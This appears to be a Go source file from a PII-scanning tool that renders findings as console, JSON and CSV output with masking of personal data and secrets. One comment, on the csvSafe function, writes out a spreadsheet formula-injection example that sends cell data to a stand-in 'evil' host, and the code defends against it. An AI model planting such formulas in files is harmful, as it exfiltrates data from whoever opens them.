// Package report renders scan results as console output, JSON, CSV, and a
// standalone HTML report, with PII values masked by default.
package report

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"sort"
	"strings"
	"time"

	"github.com/rdataback/privacylens/internal/detect"
	"github.com/rdataback/privacylens/internal/scanner"
)

// Report bundles everything a renderer needs.
type Report struct {
	Tool        string            `json:"tool"`
	Version     string            `json:"version"`
	GeneratedAt time.Time         `json:"generated_at"`
	Roots       []string          `json:"roots"`
	Masked      bool              `json:"masked"`
	Duration    string            `json:"duration"`
	Stats       scanner.Stats     `json:"stats"`
	Findings    []scanner.Finding `json:"findings"`
}

// ForOutput returns a copy of the report with findings masked unless the
// report was built with full disclosure requested.
func (r *Report) ForOutput() *Report {
	if !r.Masked {
		return r
	}
	out := *r
	out.Findings = MaskFindings(r.Findings)
	return &out
}

// redacted replaces secret values (Finding.Redact) in masked output. A fixed
// width, unlike Mask: a password gets no verify-against-source tail, and its
// length is hidden too.
const redacted = "********"

// plainCategory reports whether a finding's match is an indicator rather
// than a secret — document markings like "CUI" or "TLP:RED", or scope
// indicators like "ITAR" — and so stays unmasked: masking "TLP:RED" into
// "**P:RED" would only hide what the finding is.
func plainCategory(c string) bool {
	return c == detect.CategoryCMMC || c == detect.CategoryCMMCScope
}

// MaskFinding returns a copy of the finding with its match masked wherever
// it appears and its Redact secrets hidden. Prefer MaskFindings for a batch:
// findings that share a line each leak the other's match if masked alone.
func MaskFinding(f scanner.Finding) scanner.Finding {
	return MaskFindings([]scanner.Finding{f})[0]
}

// MaskFindings masks a batch of findings together: each finding's context
// (and mail subject) hides its own match, every other finding's match from
// the same file, and every Redact secret. Masking findings one at a time
// would leave two phone numbers on one line each shown in full in the
// other's context, and leave the password column of a credential-export CSV
// readable next to a masked username.
func MaskFindings(fs []scanner.Finding) []scanner.Finding {
	type replacement struct{ value, masked string }
	byPath := map[string][]replacement{}
	seen := map[string]bool{}
	add := func(path, value, masked string) {
		key := path + "\x00" + value
		if value == "" || seen[key] {
			return
		}
		seen[key] = true
		byPath[path] = append(byPath[path], replacement{value, masked})
	}
	// Secrets first so a value that is both a secret and a match is fully
	// redacted, not partially masked (the stable sort keeps that priority
	// between equal lengths).
	for _, f := range fs {
		for _, s := range f.Redact {
			add(f.Path, s, redacted)
		}
	}
	for _, f := range fs {
		if !plainCategory(f.Category) {
			add(f.Path, f.Match, Mask(f.Match))
		}
	}
	// Longest first, so a value containing a shorter one (412-823-0629 vs
	// 823-0629) is replaced whole before the substring breaks it apart.
	for _, repls := range byPath {
		sort.SliceStable(repls, func(i, j int) bool { return len(repls[i].value) > len(repls[j].value) })
	}

	out := make([]scanner.Finding, len(fs))
	for i, f := range fs {
		for _, r := range byPath[f.Path] {
			f.Context = strings.ReplaceAll(f.Context, r.value, r.masked)
			f.Subject = strings.ReplaceAll(f.Subject, r.value, r.masked)
		}
		if !plainCategory(f.Category) {
			f.Match = Mask(f.Match)
		}
		f.Redact = nil
		out[i] = f
	}
	return out
}

// Mask hides a PII value while leaving enough to verify against the source:
// emails keep their first character and domain; everything else keeps its
// final four alphanumeric characters and all separators.
func Mask(s string) string {
	if at := strings.IndexByte(s, '@'); at > 0 && strings.ContainsRune(s[at:], '.') {
		return s[:1] + strings.Repeat("*", at-1) + s[at:]
	}
	alnum := 0
	for _, r := range s {
		if isAlnum(r) {
			alnum++
		}
	}
	seen := 0
	return strings.Map(func(r rune) rune {
		if !isAlnum(r) {
			return r
		}
		seen++
		if seen <= alnum-4 {
			return '*'
		}
		return r
	}, s)
}

func isAlnum(r rune) bool {
	return (r >= '0' && r <= '9') || (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z')
}

// WriteJSON writes the full machine-readable report.
func WriteJSON(w io.Writer, r *Report) error {
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	return enc.Encode(r.ForOutput())
}

// WriteCSV writes one row per finding.
func WriteCSV(w io.Writer, r *Report) error {
	out := r.ForOutput()
	cw := csv.NewWriter(w)
	if err := cw.Write([]string{"path", "file_name", "category", "confidence", "line", "match", "context", "folder", "subject"}); err != nil {
		return err
	}
	for _, f := range out.Findings {
		if err := cw.Write([]string{
			csvSafe(f.Path), csvSafe(f.FileName), f.Category, f.Confidence,
			fmt.Sprintf("%d", f.Line), csvSafe(f.Match), csvSafe(f.Context), csvSafe(f.Folder), csvSafe(f.Subject),
		}); err != nil {
			return err
		}
	}
	cw.Flush()
	return cw.Error()
}

// csvSafe neutralizes spreadsheet formula injection. Report cells carry text
// lifted straight from scanned files, and Excel/Sheets execute any cell that
// starts with = + - or @ as a formula — a planted line like
// =HYPERLINK("http://evil/?"&A1) next to an SSN would run when the customer
// opens the report. A leading apostrophe makes the cell literal text (the
// standard OWASP mitigation); spreadsheets hide it on display.
func csvSafe(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + s
	}
	return s
}

// CategoryCounts returns category totals sorted by descending count.
type CategoryCount struct {
	Category string
	Count    int
}

func (r *Report) CategoryCounts() []CategoryCount {
	return categoryCounts(r.Findings)
}

func categoryCounts(fs []scanner.Finding) []CategoryCount {
	byCat := map[string]int{}
	for _, f := range fs {
		byCat[f.Category]++
	}
	out := make([]CategoryCount, 0, len(byCat))
	for c, n := range byCat {
		out = append(out, CategoryCount{c, n})
	}
	sort.Slice(out, func(i, j int) bool {
		if out[i].Count != out[j].Count {
			return out[i].Count > out[j].Count
		}
		return out[i].Category < out[j].Category
	})
	return out
}

// FileGroup is one document and everything found in it — how humans want
// results presented: "this file contains an SSN, two phone numbers, …"
// rather than interleaved per-finding rows.
type FileGroup struct {
	Path     string
	Findings []scanner.Finding
}

// CategoryCounts returns the group's per-category totals, largest first.
func (g FileGroup) CategoryCounts() []CategoryCount {
	return categoryCounts(g.Findings)
}

// FileGroups returns the findings grouped per document, preserving the
// report's path-sorted order.
func (r *Report) FileGroups() []FileGroup {
	var out []FileGroup
	idx := map[string]int{}
	for _, f := range r.Findings {
		i, ok := idx[f.Path]
		if !ok {
			i = len(out)
			idx[f.Path] = i
			out = append(out, FileGroup{Path: f.Path})
		}
		out[i].Findings = append(out[i].Findings, f)
	}
	return out
}

func (r *Report) filesWithFindings() int {
	seen := map[string]bool{}
	for _, f := range r.Findings {
		seen[f.Path] = true
	}
	return len(seen)
}

// PrintConsole writes the human-readable summary and findings list.
func PrintConsole(w io.Writer, r *Report, verbose bool) {
	out := r.ForOutput()
	fmt.Fprintf(w, "\n%s v%s — PII scan report\n", r.Tool, r.Version)
	fmt.Fprintf(w, "Scanned %d files in %s (%d skipped, %d need OCR, %d unreadable)\n",
		r.Stats.FilesScanned, r.Duration, r.Stats.FilesSkipped, r.Stats.FilesNeedOCR, r.Stats.FilesErrored)
	if n := r.Stats.FilesOCR; n > 0 {
		fmt.Fprintf(w, "Read via OCR: %d document(s) — OCR can misread characters; verify critical hits against the source\n", n)
	}
	if n := r.Stats.FilesCloud; n > 0 {
		fmt.Fprintf(w, "Cloud-only files NOT searched: %d (content lives in OneDrive/iCloud, not on disk; -include-cloud scans them but downloads each one)\n", n)
	}
	if n := r.Stats.FilesMail; n > 0 {
		fmt.Fprintf(w, "Outlook mail stores NOT searched: %d (.pst/.ost; run privacylens -mail to scan mailboxes)\n", n)
	}
	fmt.Fprintf(w, "Findings: %d across %d files\n", len(r.Findings), r.filesWithFindings())

	if len(r.Findings) > 0 {
		fmt.Fprintf(w, "\n  %-34s %s\n", "CATEGORY", "COUNT")
		for _, cc := range out.CategoryCounts() {
			fmt.Fprintf(w, "  %-34s %d\n", cc.Category, cc.Count)
		}

		lastPath := ""
		for _, f := range out.Findings {
			if f.Path != lastPath {
				fmt.Fprintf(w, "\n%s\n", f.Path)
				lastPath = f.Path
			}
			loc := fmt.Sprintf("line %d", f.Line)
			if f.Page > 0 {
				loc = fmt.Sprintf("page %d, line %d", f.Page, f.Line)
			}
			if f.Folder != "" || f.Subject != "" {
				loc = fmt.Sprintf("%s / %q (message %d)", f.Folder, f.Subject, f.Line)
			}
			fmt.Fprintf(w, "  [%s] %s  %s: %q\n",
				strings.ToUpper(f.Confidence), f.Category, loc, f.Context)
		}
	}

	if n := len(r.Stats.NeedOCR); n > 0 {
		fmt.Fprintf(w, "\nNOT searched — %d document(s) appear to be scans/images with no text layer\n(PII inside them is invisible to this scan; re-run with -ocr and tesseract\ninstalled to read them):\n", n)
		list := r.Stats.NeedOCR
		if !verbose && len(list) > 10 {
			list = list[:10]
		}
		for _, p := range list {
			fmt.Fprintf(w, "  %s\n", p)
		}
		if !verbose && n > 10 {
			fmt.Fprintf(w, "  … and %d more (run with -verbose or see the JSON report)\n", n-10)
		}
	}

	if verbose && len(r.Stats.CloudSkipped) > 0 {
		fmt.Fprintf(w, "\nCloud-only files not searched:\n")
		for _, p := range r.Stats.CloudSkipped {
			fmt.Fprintf(w, "  %s\n", p)
		}
	}

	if verbose && len(r.Stats.Errors) > 0 {
		fmt.Fprintf(w, "\nUnreadable files:\n")
		for _, e := range r.Stats.Errors {
			fmt.Fprintf(w, "  %s\n", e)
		}
	}

	if len(r.Findings) > 0 {
		if r.Masked {
			fmt.Fprintf(w, "\nValues are masked; re-run with -show-full to reveal them.\n")
		} else {
			fmt.Fprintf(w, "\nWARNING: report contains unmasked PII — store and share it accordingly.\n")
		}
	}
}
